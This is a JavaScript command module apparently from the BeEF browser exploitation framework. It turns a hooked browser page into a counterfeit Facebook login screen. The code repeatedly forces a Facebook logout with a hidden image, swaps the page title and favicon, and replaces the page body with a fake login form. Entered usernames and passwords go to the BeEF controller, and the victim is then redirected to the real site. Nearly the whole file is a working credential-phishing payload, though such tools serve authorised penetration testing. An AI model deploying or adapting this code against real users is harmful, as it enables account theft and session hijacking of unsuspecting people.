//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

function logoutFacebook() {
	var img = document.createElement("IMG");
	img.src = "https://www.facebook.com/logout.php";
	img.height = "1px";
	img.width = "1px";
	img.style.visibility = "hidden";
	document.body.appendChild(img);
	//set a new setTimeout to redo the logout
	setTimeout('logoutFacebook()', <%= @logout_facebook_interval %>);
}

beef.execute(function() {
	document.title = "Facebook - Log In or Sign Up";
	beef.browser.changeFavicon("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico");
	logoutFacebook();
    displayPhishingSite();
});

function clickedSubmitButton(){
    var credentials = "Username: "+document.getElementById('email').value+" Password: "+document.getElementById('pass').value;
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+credentials);
    //Timeout needed because otherwise the beef panel doesn't get the credentials in time
    setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
}
function redirect(){
    var theXssUrl = "<%== @xss_hook_url %>";
    if(theXssUrl){
        window.open(theXssUrl);
        window.focus();
    }
    window.location = "https://www.facebook.com/";
}

function displayPhishingSite(){
    var zztop = beef.dom.getHighestZindex()+1;
    beef.dom.removeStylesheets();
    document.body.innerHTML = "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'><title>Facebook - Log In or Sign Up</title><meta name='viewport' content='width=device-width, initial-scale=1'><link rel='icon' href='https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'><style>body,html{margin:0;padding:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}._8eso{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px}._8esk{color:#1c1e21;font-size:28px;font-weight:normal;line-height:32px;margin:-3px 0 20px}._8esl{color:#606770;font-size:15px;line-height:24px;margin:0 0 20px}._8esm{border:1px solid #dddfe2;border-radius:6px;color:#1d2129;font-size:17px;line-height:16px;padding:14px 16px;width:330px;box-sizing:border-box;margin-bottom:12px}._8esm:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff;outline:none}._8esn{background-color:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:bold;line-height:48px;padding:0 16px;width:330px;cursor:pointer;text-align:center;margin:6px 0 0}._8esn:hover{background-color:#166fe5}._8eso{width:396px;margin:0 auto}._8esp{padding:20px 0 28px}._8esq{text-align:center;color:#1c1e21;font-size:24px;font-weight:600;margin:0 0 8px}._8esr{text-align:center;color:#606770;font-size:15px;line-height:24px;width:380px;margin:0 auto 20px}._8ess{background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:bold;line-height:48px;padding:0 16px;cursor:pointer;text-decoration:none;display:inline-block;margin:0 auto;text-align:center}._8ess:hover{background:#36a420}._8est{margin:28px 0;display:flex;align-items:center;justify-content:center}._8esu{border-bottom:1px solid #dadde1;flex:1}._8esv{color:#606770;font-size:14px;font-weight:500;padding:0 20px}._8esw{text-align:center;margin-top:28px}._8esx{color:#1c1e21;font-size:14px;font-weight:600;text-decoration:none}._8esx:hover{text-decoration:underline}.container{display:flex;min-height:100vh;align-items:center;justify-content:center;padding:20px}.left-content{flex:1;max-width:580px;margin-right:40px}.facebook-logo{color:#1877f2;font-size:60px;font-weight:bold;line-height:1;margin:0 0 16px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}.tagline{color:#1c1e21;font-size:28px;font-weight:normal;line-height:32px;width:500px}.right-content{flex:0 0 396px}</style></head><body><div class='container'><div class='left-content'><h1 class='facebook-logo'>facebook</h1><h2 class='tagline'>Facebook helps you connect and share with the people in your life.</h2></div><div class='right-content'><div class='_8eso'><form onsubmit='clickedSubmitButton(); return false;'><input type='text' class='_8esm' placeholder='Email or phone number' id='email' name='email' required><input type='password' class='_8esm' placeholder='Password' id='pass' name='pass' required><button type='submit' class='_8esn'>Log In</button></form><div style='text-align:center;margin:16px 0'><a href='https://www.facebook.com/recover/initiate/' style='color:#1877f2;font-size:14px;text-decoration:none'>Forgotten password?</a></div><div class='_8est'><div class='_8esu'></div><div class='_8esv'>or</div><div class='_8esu'></div></div><div style='text-align:center'><a href='https://www.facebook.com/r.php' class='_8ess'>Create New Account</a></div></div><div class='_8esw'><a href='https://www.facebook.com/pages/create/' class='_8esx'>Create a Page</a> for a celebrity, brand or business.</div></div></div></body></html>";
}